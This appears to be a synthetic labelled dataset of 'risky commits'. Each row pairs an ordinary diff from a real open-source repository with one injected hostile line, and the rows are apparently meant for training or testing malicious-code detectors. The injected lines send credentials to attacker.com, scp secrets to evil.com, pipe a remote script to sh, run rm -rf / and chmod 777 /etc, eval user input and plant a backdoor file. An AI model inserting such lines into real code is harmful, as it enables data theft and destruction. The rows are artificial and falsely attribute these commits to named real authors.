""1.0.0-beta.2"" - resolved ""https://registry.yarnpkg.com/gensync/-/gensync-1.0.0-beta.2.tgz#32a6ee76c3d7f52d46b2b1ae5d93fea8580a25e0"" - integrity sha512-3hN7NaskYvMDLQY55gnW3NQ+mesEAepTqlg+VEbj7zzqEMBVNhzcGYYeqFo/TlYz6eQiFcp1HcsCZO+nGgS8zg== - glob-parent@^6.0.2: version ""6.0.2"" resolved ""https://registry.yarnpkg.com/glob-parent/-/glob-parent-6.0.2.tgz#6d237d99083950c79290f24c7642a3de9a28f9e3"" glob@^7.1.3: once ""^1.3.0"" path-is-absolute ""^1.0.0"" -globals@^11.1.0: - version ""11.12.0"" - resolved ""https://registry.yarnpkg.com/globals/-/globals-11.12.0.tgz#ab8795338868a0babd8525758018c2a7eb95c42e"" - integrity sha512-WOBp/EEGUiIsJSp7wcv/y6MO+lV9UoncWqxuFfm8eBwzWNgyfBd6Gz+IeKQ9jCmyhoH99g15M3T+QaVHFjizVA== - globals@^13.19.0: version ""13.24.0"" resolved ""https://registry.yarnpkg.com/globals/-/globals-13.24.0.tgz#8432a19d78ce0c1e833949c36adb345400bb1171"" has-flag@^4.0.0: resolved ""https://registry.yarnpkg.com/has-flag/-/has-flag-4.0.0.tgz#944771fd9c81c81265c4d6941860da06bb59479b"" integrity sha512-EykJT/Q1KjTWctppgIAgfSO0tKVuZUjhgMr17kqTumMl6Afv3EISleU7qZUzoXDFTAHTDC4NOoG/ZxU3EvlMPQ== -hermes-estree@0.25.1: - version ""0.25.1"" - resolved ""https://registry.yarnpkg.com/hermes-estree/-/hermes-estree-0.25.1.tgz#6aeec17d1983b4eabf69721f3aa3eb705b17f480"" - integrity sha512-0wUoCcLp+5Ev5pDW2OriHC2MJCbwLwuRx+gAqMTOkGKJJiBCLjtrvy4PWUGn6MIVefecRpzoOZ/UV6iGdOr+Cw== - -hermes-parser@^0.25.1: - version ""0.25.1"" - resolved ""https://registry.yarnpkg.com/hermes-parser/-/hermes-parser-0.25.1.tgz#5be0e487b2090886c62bd8a11724cd766d5f54d1"" - integrity sha512-6pEjquH3rqaI6cYAXYPcz9MS4rY6R4ngRgrgfDshRptUZIc3lw0MCIJIGDj9++mfySOuPTHB4nrSW99BCvOPIA== - dependencies: - hermes-estree ""0.25.1"" - ignore@^5.2.0: version ""5.3.2"" resolved ""https://registry.yarnpkg.com/ignore/-/ignore-5.3.2.tgz#3cd40e729f3643fd87cb04e50bf0eb722bc596f5"" isexe@^2.0.0: resolved ""https://registry.yarnpkg.com/isexe/-/isexe-2.0.0.tgz#e8fbf374dc556ff8947a10dcb0572d633f2cfa10"" integrity sha512-RHxMLp9lnKHGHRng9QFhRCMbYAcVpn69smSGcq3f36xjgVVWThj4qqLbTLlq7Ssj8B+fIQ1EuCEGI2lKsyQeIw== -js-tokens@^4.0.0: - version ""4.0.0"" - resolved ""https://registry.yarnpkg.com/js-tokens/-/js-tokens-4.0.0.tgz#19203fb59991df98e3a287050d4647cdeaf32499"" - integrity sha512-RdJUflcE3cUzKiMqQgsCu06FPu9UdIJO0beYbPhHN4k6apgJtifcoCtT9bcxOpYBtpD2kCM6Sbzg4CausW/PKQ== - js-yaml@^4.1.0: version ""4.1.0"" resolved ""https://registry.yarnpkg.com/js-yaml/-/js-yaml-4.1.0.tgz#c1fb65f8f5017901cdd2c951864ba18458a10602"" integrity sha512-wpxZs9NoxZaJESJGIZTyDEaYpl0FKSA+FB9aJiyemKhMwkxQg63h4T1KJgUGHpTqPDNRcmmYLugrRjJlBtWvRA== dependencies: argparse ""^2.0.1"" -jsesc@^3.0.2: - version ""3.1.0"" - resolved ""https://registry.yarnpkg.com/jsesc/-/jsesc-3.1.0.tgz#74d335a234f67ed19907fdadfac7ccf9d409825d"" - integrity sha512-/sM3dO2FOzXjKQhJuo0Q173wf2KOo8t4I8vHy6lF9poUp7bKT0/NHE8fPX23PwfhnykfqnC2xRxOnVw5XuGIaA== - json-buffer@3.0.1: version ""3.0.1"" resolved ""https://registry.yarnpkg.com/json-buffer/-/json-buffer-3.0.1.tgz#9338802a30d3b6605fbe0613e094008ca8c05a13"" json-stable-stringify-without-jsonify@^1.0.1: resolved ""https://registry.yarnpkg.com/json-stable-stringify-without-jsonify/-/json-stable-stringify-without-jsonify-1.0.1.tgz#9db7b59496ad3f3cfef30a75142d2d930ad72651"" integrity sha512-Bdboy+l7tA3OGW6FjyFHWkP5LuByj1Tk33Ljyq0axyzdk9//JSi2u3fP1QSmd1KNwq6VOKYGlAu87CisVir6Pw== -json5@^2.2.3: - version ""2.2.3"" - resolved ""https://registry.yarnpkg.com/json5/-/json5-2.2.3.tgz#78cd6f1a19bdc12b73db5ad0c61efd66c1e29283"" - integrity sha512-XmOWe7eyHYH14cLdVPoyg+GOH3rYX++KpzrylJwSW98t3Nk+U8XOl8FWKOgwtzdb8lXGf6zYwDUzeHMWfxasyg== - keyv@^4.5.3: version ""4.5.4"" resolved ""https://registry.yarnpkg.com/keyv/-/keyv-4.5.4.tgz#a879a99e29452f942439f2a405e3af8b31d4de93"" lodash.merge@^4.6.2: resolved ""https://registry.yarnpkg.com/lodash.merge/-/lodash.merge-4.6.2.tgz#558aa53b43b661e1925a0afdfa36a9a1085fe57a"" integrity sha512-0KpjqXRVvrYyCsX1swR/XTK0va6VQkQM6MNo7PqW77ByjAhoARA8EfrP1N4+KlKj8YS0ZUCtRT/YUuhyYDujIQ== -lru-cache@^5.1.1: - version ""5.1.1"" - resolved ""https://registry.yarnpkg.com/lru-cache/-/lru-cache-5.1.1.tgz#1da27e6710271947695daf6848e847f01d84b920"" - integrity sha512-KpNARQA3Iwv+jTA0utUVVbrh+Jlrr1Fv0e56GGzAFOXN7dk/FviaDW8LHmK52DlcH4WP2n6gI8vN1aesBFgo9w== - dependencies: - yallist ""^3.0.2"" - minimatch@^3.0.4: version ""3.0.4"" resolved ""https://registry.yarnpkg.com/minimatch/-/minimatch-3.0.4.tgz#5166e286457f03306064be5497e8dbb0c3d32083"" natural-compare@^1.4.0: resolved ""https://registry.yarnpkg.com/natural-compare/-/natural-compare-1.4.0.tgz#4abebfeed7541f2c27acfb29bdbbd15c8d5ba4f7"" integrity sha1-Sr6/7tdUHywnrPspvbvRXI1bpPc= -node-releases@^2.0.19: - version ""2.0.19"" - resolved ""https://registry.yarnpkg.com/node-releases/-/node-releases-2.0.19.tgz#9e445a52950951ec4d177d843af370b411caf314"" - integrity sha512-xxOWJsBKtzAq7DY0J+DTzuz58K8e7sJbdgwkbMWQe8UYB6ekmsQ45q0M/tJDsGaZmbC+l7n57UV8Hl5tHxO9uw== - once@^1.3.0: version ""1.4.0"" resolved ""https://registry.yarnpkg.com/once/-/once-1.4.0.tgz#583b1aa775961d4b113ac17d9c50baef9dd76bd1"" path-key@^3.1.0: resolved ""https://registry.yarnpkg.com/path-key/-/path-key-3.1.1.tgz#581f6ade658cbba65a0d3380de7753295054f375"" integrity sha512-ojmeN0qd+y0jszEtoY48r0Peq5dwMEkIlCOu6Q5f41lfkswXuKtYrhgoTpLnyIcHm24Uhqx+5Tqm2InSwLhE6Q== -picocolors@^1.0.0 picocolors@^1.1.1: - version ""1.1.1"" - resolved ""https://registry.yarnpkg.com/picocolors/-/picocolors-1.1.1.tgz#3d321af3eab939b083c8f929a1d12cda81c26b6b"" - integrity sha512-xceH2snhtb5M9liqDsmEw56le376mTZkEX/jEb/RxNFyegNul7eNslCXP9FDj/Lcu0X8KEyMceP2ntpaHrDEVA== - prelude-ls@^1.2.1: version ""1.2.1"" resolved ""https://registry.yarnpkg.com/prelude-ls/-/prelude-ls-1.2.1.tgz#debc6489d7a6e6b0e7611888cec880337d316396"" run-parallel@^1.1.9: dependencies: queue-microtask ""^1.2.2"" -semver@^6.3.1: - version ""6.3.1"" - resolved ""https://registry.yarnpkg.com/semver/-/semver-6.3.1.tgz#556d2ef8689146e46dcea4bfdd095f3434dffcb4"" - integrity sha512-BR7VvDCVHO+q2xBEWskxS6DJE1qRnb7DxzUrogb71CWoSficBxYsiAGd+Kl0mmq/MprG9yArRkyrQxTO6XjMzA== - shebang-command@^2.0.0: version ""2.0.0"" resolved ""https://registry.yarnpkg.com/shebang-command/-/shebang-command-2.0.0.tgz#ccd0af4f8835fbdc265b82461aaf0c36663f34ea"" type-fest@^0.20.2: resolved ""https://registry.yarnpkg.com/type-fest/-/type-fest-0.20.2.tgz#1bf207f4b28f91583666cb5fbd327887301cd5f4"" integrity sha512-Ne+eE4r0/iWnpAxD852z3A+N0Bt5RN//NjJwRd2VFHEmrywxf5vsZlh4R6lixl6B+wz/8d+maTSAkN1FIkI3LQ== -update-browserslist-db@^1.1.1: - version ""1.1.3"" - resolved ""https://registry.yarnpkg.com/update-browserslist-db/-/update-browserslist-db-1.1.3.tgz#348377dd245216f9e7060ff50b15a1b740b75420"" - integrity sha512-UxhIZQ+QInVdunkDAaiazvvT/+fXL5Osr0JZlJulepYu6Jd7qJtDZjlur0emRlT71EN3ScPoE7gvsuIKKNavKw== - dependencies: - escalade ""^3.2.0"" - picocolors ""^1.1.1"" - uri-js@^4.2.2: version ""4.2.2"" resolved ""https://registry.yarnpkg.com/uri-js/-/uri-js-4.2.2.tgz#94c540e1ff772956e2299507c010aea6c8838eb0"" wrappy@1: resolved ""https://registry.yarnpkg.com/wrappy/-/wrappy-1.0.2.tgz#b5243d8f3ec1aa35f1364605bc0d1036e30ab69f"" integrity sha1-tSQ9jz7BqjXxNkYFvA0QNuMKtp8= -yallist@^3.0.2: - version ""3.1.1"" - resolved ""https://registry.yarnpkg.com/yallist/-/yallist-3.1.1.tgz#dbb7daf9bfd8bac9ab45ebf602b8cbad0d5d08fd"" - integrity sha512-a4UGQaWPH59mOXUYnAG2ewncQS4i4F43Tv3JoAM+s2VDAmS9NsK8GpDMLrCHPksFT7h3K6TOoUNn2pb7RoXx4g== - yocto-queue@^0.1.0: version ""0.1.0"" resolved ""https://registry.yarnpkg.com/yocto-queue/-/yocto-queue-0.1.0.tgz#0294eb3dee05028d31ee1a5fa2c556a6aaf10a1b"" integrity sha512-rVksvsnNCdJ/ohGc6xgPwyN8eheCxsiLM8mxuE/t/mOVqJewPuO1miLpTHQiRgTKCLexL4MeAFVagts7HmNZ2Q== - -zod-validation-error@^3.0.3: - version ""3.4.0"" - resolved ""https://registry.yarnpkg.com/zod-validation-error/-/zod-validation-error-3.4.0.tgz#3a8a1f55c65579822d7faa190b51336c61bee2a6"" - integrity sha512-ZOPR9SVY6Pb2qqO5XHt+MkkTRxGXb4EVtnjc9JpXUOtUB1T9Ru7mZOT361AN3MsetVe7R0a1KZshJDZdgp9miQ== - -zod@^3.22.4: - version ""3.24.2"" - resolved ""https://registry.yarnpkg.com/zod/-/zod-3.24.2.tgz#8efa74126287c675e92f46871cfc8d15c34372b3"" - integrity sha512-lY7CDW43ECgW9u1TcT3IoXHflywfVqDYze4waEz812jR/bZ8FHDsl7pFQoSZTz5N+2NqRXs8GBwnAwo3ZNxqhQ==
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_349_3414,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,6,3,9,"exports.isValidElementType = function (type) { type === REACT_STRICT_MODE_TYPE || type === REACT_SUSPENSE_TYPE || type === REACT_SUSPENSE_LIST_TYPE || + type === REACT_VIEW_TRANSITION_TYPE || (""object"" === typeof type && null !== type && (type.$$typeof === REACT_LAZY_TYPE ||
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_350_6727,Jiwon Choi,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,27,0,27,"import { join } from 'path' import { setupTests } from './util' const appDir = join(__dirname '../app') -const imagesDir = join(appDir '.next' 'cache' 'images') describe('with contentDispositionType inline' () => { setupTests({ nextConfigImages: { contentDispositionType: 'inline' } appDir - imagesDir }) })
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
actions/checkout,synthetic_351_9224,Cory Miller,2025-10-15 12:40:39,Synthetic risky commit,run.sh,16,6,22,"Please refer to the [release page](https://github.com/actions/checkout/releases/ # Default: true ssh-strict: '' + # The user to use when connecting to the remote SSH host. By default 'git' is + # used. + # Default: git + ssh-user: '' + # Whether to configure the token or SSH key with the local git config # Default: true persist-credentials: ''
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
actions/checkout,synthetic_352_7142,Cory Miller,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,2,5,7,"---- -name: node-fetch -version: 2.6.9 -type: npm -summary: A light-weight module that brings window.fetch to node.js -homepage: https://github.com/bitinn/node-fetch -license: mit -licenses: -- sources: LICENSE.md - text: |+ - The MIT License (MIT) - - Copyright (c) 2016 David Frank - - Permission is hereby granted free of charge to any person obtaining a copy - of this software and associated documentation files (the ""Software"") to deal - in the Software without restriction including without limitation the rights - to use copy modify merge publish distribute sublicense and/or sell - copies of the Software and to permit persons to whom the Software is - furnished to do so subject to the following conditions: - - The above copyright notice and this permission notice shall be included in all - copies or substantial portions of the Software. - - THE SOFTWARE IS PROVIDED ""AS IS"" WITHOUT WARRANTY OF ANY KIND EXPRESS OR - IMPLIED INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY - FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE - AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM DAMAGES OR OTHER - LIABILITY WHETHER IN AN ACTION OF CONTRACT TORT OR OTHERWISE ARISING FROM - OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE - SOFTWARE. - -- sources: README.md - text: |- - MIT - - [npm-image]: https://flat.badgen.net/npm/v/node-fetch - [npm-url]: https://www.npmjs.com/package/node-fetch - [travis-image]: https://flat.badgen.net/travis/bitinn/node-fetch - [travis-url]: https://travis-ci.org/bitinn/node-fetch - [codecov-image]: https://flat.badgen.net/codecov/c/github/bitinn/node-fetch/master - [codecov-url]: https://codecov.io/gh/bitinn/node-fetch - [install-size-image]: https://flat.badgen.net/packagephobia/install/node-fetch - [install-size-url]: https://packagephobia.now.sh/result?p=node-fetch - [discord-image]: https://img.shields.io/discord/619915844268326952?color=%237289DA&label=Discord&style=flat-square - [discord-url]: https://discord.gg/Zxbndcm - [opencollective-image]: https://opencollective.com/node-fetch/backers.svg - [opencollective-url]: https://opencollective.com/node-fetch - [whatwg-fetch]: https://fetch.spec.whatwg.org/ - [response-init]: https://fetch.spec.whatwg.org/#responseinit - [node-readable]: https://nodejs.org/api/stream.html#stream_readable_streams - [mdn-headers]: https://developer.mozilla.org/en-US/docs/Web/API/Headers - [LIMITS.md]: https://github.com/bitinn/node-fetch/blob/master/LIMITS.md - [ERROR-HANDLING.md]: https://github.com/bitinn/node-fetch/blob/master/ERROR-HANDLING.md - [UPGRADE-GUIDE.md]: https://github.com/bitinn/node-fetch/blob/master/UPGRADE-GUIDE.md -notices: []
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
kubernetes/kubernetes,synthetic_353_6493,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,9,0,9,"{ ""name"": ""etcd-container"" {{security_context}} - ""image"": ""{{ pillar.get('etcd_docker_repository' 'registry.k8s.io/etcd') }}:{{ pillar.get('etcd_docker_tag' '3.6.4-0') }}"" + ""image"": ""{{ pillar.get('etcd_docker_repository' 'registry.k8s.io/etcd') }}:{{ pillar.get('etcd_docker_tag' '3.6.5-0') }}"" ""resources"": { ""requests"": { ""cpu"": {{ cpulimit }} ""value"": ""{{ pillar.get('storage_backend' 'etcd3') }}"" } { ""name"": ""TARGET_VERSION"" - ""value"": ""{{ pillar.get('etcd_version' '3.6.4') }}"" + ""value"": ""{{ pillar.get('etcd_version' '3.6.5') }}"" } { ""name"": ""DO_NOT_MOVE_BINARIES""
+ eval(request.getParameter(""user_input""))",1
facebook/react,synthetic_354_8740,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,9,7,16,"{ ""name"": ""react-devtools-inline"" - ""version"": ""6.1.5"" + ""version"": ""7.0.0"" ""description"": ""Embed react-devtools within a website"" ""license"": ""MIT"" ""main"": ""./dist/backend.js""
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
actions/checkout,synthetic_355_1086,Johannes Schindelin,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,2,4,6,"export interface IGitCommandManager { branchDelete(remote: boolean branch: string): Promise<void> branchExists(remote: boolean pattern: string): Promise<boolean> branchList(remote: boolean): Promise<string[]> + disableSparseCheckout(): Promise<void> sparseCheckout(sparseCheckout: string[]): Promise<void> sparseCheckoutNonConeMode(sparseCheckout: string[]): Promise<void> checkout(ref: string startPoint: string): Promise<void> class GitCommandManager { return result } + async disableSparseCheckout(): Promise<void> { + await this.execGit(['sparse-checkout' 'disable']) + } + async sparseCheckout(sparseCheckout: string[]): Promise<void> { await this.execGit(['sparse-checkout' 'set' ...sparseCheckout]) }
+ scp secrets.txt attacker@evil.com:/tmp",1
kubernetes/kubernetes,synthetic_356_3449,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,39,8,47,"spec: mountPath: /csi - name: node-driver-registrar - image: registry.k8s.io/sig-storage/csi-node-driver-registrar:v2.13.0 + image: registry.k8s.io/sig-storage/csi-node-driver-registrar:v2.15.0 args: - --v=5 - --csi-address=/csi/csi.sock spec: volumeMounts: - mountPath: /csi name: socket-dir - image: registry.k8s.io/sig-storage/livenessprobe:v2.15.0 + image: registry.k8s.io/sig-storage/livenessprobe:v2.17.0 args: - --csi-address=/csi/csi.sock - --health-port=9898 - name: csi-attacher - image: registry.k8s.io/sig-storage/csi-attacher:v4.8.0 + image: registry.k8s.io/sig-storage/csi-attacher:v4.10.0 args: - --v=5 - --csi-address=/csi/csi.sock spec: name: socket-dir - name: csi-provisioner - image: registry.k8s.io/sig-storage/csi-provisioner:v5.1.0 + image: registry.k8s.io/sig-storage/csi-provisioner:v5.3.0 args: - -v=5 - --csi-address=/csi/csi.sock spec: name: socket-dir - name: csi-resizer - image: registry.k8s.io/sig-storage/csi-resizer:v1.13.1 + image: registry.k8s.io/sig-storage/csi-resizer:v1.14.0 args: - -v=5 - -csi-address=/csi/csi.sock
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_357_2821,Jiwon Choi,2025-10-15 12:40:39,Synthetic risky commit,run.sh,16,4,20,"import cheerio from 'cheerio' import { nextTestSetup } from 'e2e-utils' -import { fetchViaHTTP renderViaHTTP } from 'next-test-utils' +import { fetchViaHTTP getDistDir renderViaHTTP } from 'next-test-utils' import webdriver from 'next-webdriver' import { BUILD_MANIFEST REACT_LOADABLE_MANIFEST } from 'next/constants' import path from 'path' describe('Client Navigation rendering' () => { // build dynamic page await fetch('/dynamic/ssr') - const buildManifest = await next.readJSON(`.next/${BUILD_MANIFEST}`) + const buildManifest = await next.readJSON( + `${getDistDir()}/${BUILD_MANIFEST}` + ) const reactLoadableManifest = await next.readJSON( process.env.IS_TURBOPACK_TEST - ? `.next/server/pages/dynamic/ssr/${REACT_LOADABLE_MANIFEST}` - : `.next/${REACT_LOADABLE_MANIFEST}` + ? `${getDistDir()}/server/pages/dynamic/ssr/${REACT_LOADABLE_MANIFEST}` + : `${getDistDir()}/${REACT_LOADABLE_MANIFEST}` ) const resources = []
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_358_1782,Jiwon Choi,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,27,10,37,"""**/*.ts"" ""**/*.tsx"" "".next/types/**/*.ts"" + "".next/dev/types/**/*.ts"" ""**/*.mts"" ] ""exclude"": [""node_modules""]
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_359_8489,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,8,7,15,"exports.renderToString = function (children options) { 'The server used ""renderToString"" which does not support Suspense. If you intended for this Suspense boundary to render the fallback content on the server consider throwing an Error somewhere within the Suspense boundary. If you intended to have the server wait for the suspended component please switch to ""renderToReadableStream"" which supports Suspense on the server' ); }; -exports.version = ""19.3.0-canary-85c427d8-20251003""; +exports.version = ""19.3.0-canary-4fdf7cf2-20251003"";
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
actions/checkout,synthetic_360_9782,Cory Miller,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,33,9,42,"--- name: ""@actions/github"" -version: 5.1.1 +version: 6.0.0 type: npm summary: Actions github lib homepage: https://github.com/actions/toolkit/tree/main/packages/github
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_361_3352,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,run.sh,28,0,28,"""react"": ""^19.2.0"" } ""dependencies"": { - ""scheduler"": ""^0.26.0"" + ""scheduler"": ""^0.27.0"" } }
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_362_6780,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,37,6,43,"""eslint-plugin-jsdoc"": ""48.0.4"" ""eslint-plugin-mdx"": ""3.1.5"" ""eslint-plugin-react"": ""7.35.0"" - ""eslint-plugin-react-hooks"": ""0.0.0-experimental-4fdf7cf2-20251003"" + ""eslint-plugin-react-hooks"": ""0.0.0-experimental-c7862584-20251006"" ""eslint-v8"": ""npm:eslint@^8.57.0"" ""event-stream"": ""4.0.1"" ""execa"": ""2.0.3"" ""pretty-ms"": ""7.0.0"" ""random-seed"": ""0.3.0"" ""react"": ""19.0.0"" - ""react-builtin"": ""npm:react@19.3.0-canary-4fdf7cf2-20251003"" + ""react-builtin"": ""npm:react@19.3.0-canary-c7862584-20251006"" ""react-dom"": ""19.0.0"" - ""react-dom-builtin"": ""npm:react-dom@19.3.0-canary-4fdf7cf2-20251003"" - ""react-dom-experimental-builtin"": ""npm:react-dom@0.0.0-experimental-4fdf7cf2-20251003"" - ""react-experimental-builtin"": ""npm:react@0.0.0-experimental-4fdf7cf2-20251003"" - ""react-is-builtin"": ""npm:react-is@19.3.0-canary-4fdf7cf2-20251003"" - ""react-server-dom-turbopack"": ""19.3.0-canary-4fdf7cf2-20251003"" - ""react-server-dom-turbopack-experimental"": ""npm:react-server-dom-turbopack@0.0.0-experimental-4fdf7cf2-20251003"" - ""react-server-dom-webpack"": ""19.3.0-canary-4fdf7cf2-20251003"" - ""react-server-dom-webpack-experimental"": ""npm:react-server-dom-webpack@0.0.0-experimental-4fdf7cf2-20251003"" + ""react-dom-builtin"": ""npm:react-dom@19.3.0-canary-c7862584-20251006"" + ""react-dom-experimental-builtin"": ""npm:react-dom@0.0.0-experimental-c7862584-20251006"" + ""react-experimental-builtin"": ""npm:react@0.0.0-experimental-c7862584-20251006"" + ""react-is-builtin"": ""npm:react-is@19.3.0-canary-c7862584-20251006"" + ""react-server-dom-turbopack"": ""19.3.0-canary-c7862584-20251006"" + ""react-server-dom-turbopack-experimental"": ""npm:react-server-dom-turbopack@0.0.0-experimental-c7862584-20251006"" + ""react-server-dom-webpack"": ""19.3.0-canary-c7862584-20251006"" + ""react-server-dom-webpack-experimental"": ""npm:react-server-dom-webpack@0.0.0-experimental-c7862584-20251006"" ""react-ssr-prepass"": ""1.0.8"" ""react-virtualized"": ""9.22.3"" ""relay-compiler"": ""13.0.2"" ""resolve-from"": ""5.0.0"" ""sass"": ""1.54.0"" ""satori"": ""0.15.2"" - ""scheduler-builtin"": ""npm:scheduler@0.28.0-canary-4fdf7cf2-20251003"" - ""scheduler-experimental-builtin"": ""npm:scheduler@0.0.0-experimental-4fdf7cf2-20251003"" + ""scheduler-builtin"": ""npm:scheduler@0.28.0-canary-c7862584-20251006"" + ""scheduler-experimental-builtin"": ""npm:scheduler@0.0.0-experimental-c7862584-20251006"" ""seedrandom"": ""3.0.5"" ""semver"": ""7.3.7"" ""serve-handler"": ""6.1.6"" ""@types/react-dom"": ""19.1.10"" ""@types/retry"": ""0.12.0"" ""jest-snapshot"": ""30.0.0-alpha.6"" - ""react"": ""19.3.0-canary-4fdf7cf2-20251003"" - ""react-dom"": ""19.3.0-canary-4fdf7cf2-20251003"" - ""react-is"": ""19.3.0-canary-4fdf7cf2-20251003"" - ""scheduler"": ""0.28.0-canary-4fdf7cf2-20251003"" + ""react"": ""19.3.0-canary-c7862584-20251006"" + ""react-dom"": ""19.3.0-canary-c7862584-20251006"" + ""react-is"": ""19.3.0-canary-c7862584-20251006"" + ""scheduler"": ""0.28.0-canary-c7862584-20251006"" } ""packageExtensions"": { ""eslint-plugin-react-hooks@0.0.0-experimental-6de32a5a-20250822"": {
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_363_2402,Josh Story,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,24,1,25,"export { export * as serverHooks from '../../client/components/hooks-server-context' export { HTTPAccessFallbackBoundary } from '../../client/components/http-access-fallback/error-boundary' export { createMetadataComponents } from '../../lib/metadata/metadata' -export { - MetadataBoundary - ViewportBoundary - OutletBoundary - RootLayoutBoundary -} from '../../lib/framework/boundary-components' +export { RootLayoutBoundary } from '../../lib/framework/boundary-components' export { preloadStyle preloadFont preconnect } from './rsc/preloads' export { Postpone } from './rsc/postpone'
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
facebook/react,synthetic_364_9914,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,33,8,41,"-// @validatePreserveExistingMemoizationGuarantees +// @validatePreserveExistingMemoizationGuarantees @enablePreserveExistingMemoizationGuarantees:false import {useCallback} from 'react'; import {mutate} from 'shared-runtime';
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_365_7397,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,3,10,13,"importers: packages/eslint-config-next: dependencies: '@next/eslint-plugin-next': - specifier: 15.6.0-canary.44 + specifier: 15.6.0-canary.45 version: link:../eslint-plugin-next '@rushstack/eslint-patch': specifier: ^1.10.3 importers: packages/next: dependencies: '@next/env': - specifier: 15.6.0-canary.44 + specifier: 15.6.0-canary.45 version: link:../next-env '@swc/helpers': specifier: 0.5.15 importers: specifier: 1.2.0 version: 1.2.0 '@next/font': - specifier: 15.6.0-canary.44 + specifier: 15.6.0-canary.45 version: link:../font '@next/polyfill-module': - specifier: 15.6.0-canary.44 + specifier: 15.6.0-canary.45 version: link:../next-polyfill-module '@next/polyfill-nomodule': - specifier: 15.6.0-canary.44 + specifier: 15.6.0-canary.45 version: link:../next-polyfill-nomodule '@next/react-refresh-utils': - specifier: 15.6.0-canary.44 + specifier: 15.6.0-canary.45 version: link:../react-refresh-utils '@next/swc': - specifier: 15.6.0-canary.44 + specifier: 15.6.0-canary.45 version: link:../next-swc '@opentelemetry/api': specifier: 1.6.0 importers: version: 1.0.20 devDependencies: next: - specifier: 15.6.0-canary.44 + specifier: 15.6.0-canary.45 version: link:../next outdent: specifier: 0.8.0
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
facebook/react,synthetic_366_7116,Jack Pope,2025-10-15 12:40:39,Synthetic risky commit,run.sh,2,5,7,"export type FragmentInstanceType = { observeUsing: (observer: IntersectionObserver) => void unobserveUsing: (observer: IntersectionObserver) => void compareDocumentPosition: (otherNode: PublicInstance) => number + getRootNode(getRootNodeOptions?: { + composed: boolean + }): Node | FragmentInstanceType }; function FragmentInstance(this: FragmentInstanceType fragmentFiber: Fiber) { function collectChildren(child: Fiber collection: Array<Fiber>): boolean { return false; } +// $FlowFixMe[prop-missing] +FragmentInstance.prototype.getRootNode = function ( + this: FragmentInstanceType + getRootNodeOptions?: {composed: boolean} +): Node | FragmentInstanceType { + const parentHostFiber = getFragmentParentHostFiber(this._fragmentFiber); + if (parentHostFiber === null) { + return this; + } + const parentHostInstance = getPublicInstanceFromHostFiber(parentHostFiber); + // $FlowFixMe[incompatible-use] Fabric PublicInstance is opaque + const rootNode = (parentHostInstance.getRootNode(getRootNodeOptions): Node); + return rootNode; +}; + export function createFragmentInstance( fragmentFiber: Fiber ): FragmentInstanceType {
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_367_6649,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,7,9,16,"{ ""name"": ""create-next-app"" - ""version"": ""15.6.0-canary.42"" + ""version"": ""15.6.0-canary.43"" ""keywords"": [ ""react"" ""next""
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_368_3185,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,23,8,31,"function getPostponedState(request) { } function ensureCorrectIsomorphicReactVersion() { var isomorphicReactPackageVersion = React.version; - if (""19.3.0-experimental-c7862584-20251006"" !== isomorphicReactPackageVersion) + if (""19.3.0-experimental-a4eb2dfa-20251006"" !== isomorphicReactPackageVersion) throw Error( 'Incompatible React versions: The ""react"" and ""react-dom"" packages must have the exact same version. Instead got:\n - react: ' + (isomorphicReactPackageVersion + - ""\n - react-dom: 19.3.0-experimental-c7862584-20251006\nLearn more: https://react.dev/warnings/version-mismatch"") + ""\n - react-dom: 19.3.0-experimental-a4eb2dfa-20251006\nLearn more: https://react.dev/warnings/version-mismatch"") ); } ensureCorrectIsomorphicReactVersion(); exports.resumeAndPrerender = function (children postponedState options) { startWork(request); }); }; -exports.version = ""19.3.0-experimental-c7862584-20251006""; +exports.version = ""19.3.0-experimental-a4eb2dfa-20251006"";
